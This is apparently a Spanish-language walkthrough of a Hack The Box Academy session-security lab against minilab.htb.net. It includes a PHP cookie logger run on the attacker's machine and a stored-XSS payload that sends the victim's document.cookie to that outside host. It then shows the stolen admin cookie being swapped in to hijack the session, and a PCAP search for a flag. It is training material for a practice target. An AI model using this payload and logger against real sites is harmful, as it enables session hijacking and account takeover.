---
description: 'Target(s): 10.129.54.17 (ACADEMY-SESSION-ATTACKS) | vHosts : minilab.htb.net'
---

# Session Security

Actualmente estás participando en un programa de bug bounty.

* La única URL incluida en el programa es http://minilab.htb.net
* Los ataques a usuarios finales a través de ataques del lado del cliente están incluidos en este programa de bug bounty.
* Credenciales de la cuenta de prueba:&#x20;
  * Correo electrónico: heavycat106
  * Contraseña: rocknrol
* Mediante dirbusting, has identificado el siguiente endpoint http://minilab.htb.net/submit-solution

Encuentra una forma de secuestrar la sesión de un administrador. Una vez que lo haya hecho, responda a las dos preguntas siguientes.

**Pregunta 1:** Lee la flag que aparece en el perfil público del administrador. Formato de la respuesta: \[string]

1. Apuntamos el dominio a la IP del objetivo:

`sudo nano /etc/hosts`

<figure><img src="../../../../.gitbook/assets/image (345).png" alt=""><figcaption></figcaption></figure>

2. Entramos a través del navegador al dominio minilab.htb.net y accedemos con las credenciales heavycat106:rocknrol

<figure><img src="../../../../.gitbook/assets/image (346).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (347).png" alt=""><figcaption></figcaption></figure>

3. En los campos del formulario, probaremos un XSS:

```
<script>alert(1)</script
```

<figure><img src="../../../../.gitbook/assets/image (348).png" alt=""><figcaption></figcaption></figure>

4. Le damos al botón “Share” y se ejecutará el script:

<figure><img src="../../../../.gitbook/assets/image (349).png" alt=""><figcaption></figcaption></figure>

5. Creamos en nuestra máquina atacante la siguiente página **index.php** y **log.php**:

```
<?php
    $logFile = "cookieLog.txt";
    $cookie = $_REQUEST["c"];
    $handle = fopen($logFile, "a");
    fwrite($handle, $cookie . "\n\n");
    fclose($handle);
    header("Location: http://www.google.com/");
    exit;
?>
```

6. Levantamos un servidor con php:

```bash
php -S 10.10.14.176:8000
```

7. Ejecutaremos el siguiente payload en el campo Country haciendo click en Share:

```
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.14.176:8000/index.php?c=' + document.cookie;"></video>
```

<figure><img src="../../../../.gitbook/assets/image (350).png" alt=""><figcaption></figcaption></figure>

8. Y ahora visitaremos el siguiente enlace:

```
http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
```

**Target**(s): 10.129.178.16

<figure><img src="../../../../.gitbook/assets/image (351).png" alt=""><figcaption></figcaption></figure>

9. Vamos al terminal que teniamos a la escucha y vemos que se captura la cookie:

<figure><img src="../../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

* También la tenemos capturada en cookieLog.txt:

<figure><img src="../../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

**Target**(s): 10.129.215.7

10. Volvemos al navegador a minilab.htb.net, abrimos las herramientas de navegador > Storage y cambiamos la cookie por la que hemos capturado:

<figure><img src="../../../../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

11. Conseguimos entrar al perfil del admin, hacemos click en Change Visibility:

<figure><img src="../../../../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

12. Hacemos click en el botón Share:

<figure><img src="../../../../.gitbook/assets/image (357).png" alt=""><figcaption></figcaption></figure>

**Pregunta 2**: Revisa el archivo PCAP que se encuentra en el perfil público del administrador e identifica la flag. Formato de la respuesta: FLAG{string}

1. Le damos al botón “Flag2” y se nos descargará un pcap. Lo abrimos con Wireshark y aplicamos una búsqueda de paquete:&#x20;

Edit -> Find Packet -> “FLAG”

<figure><img src="../../../../.gitbook/assets/image (358).png" alt=""><figcaption></figcaption></figure>
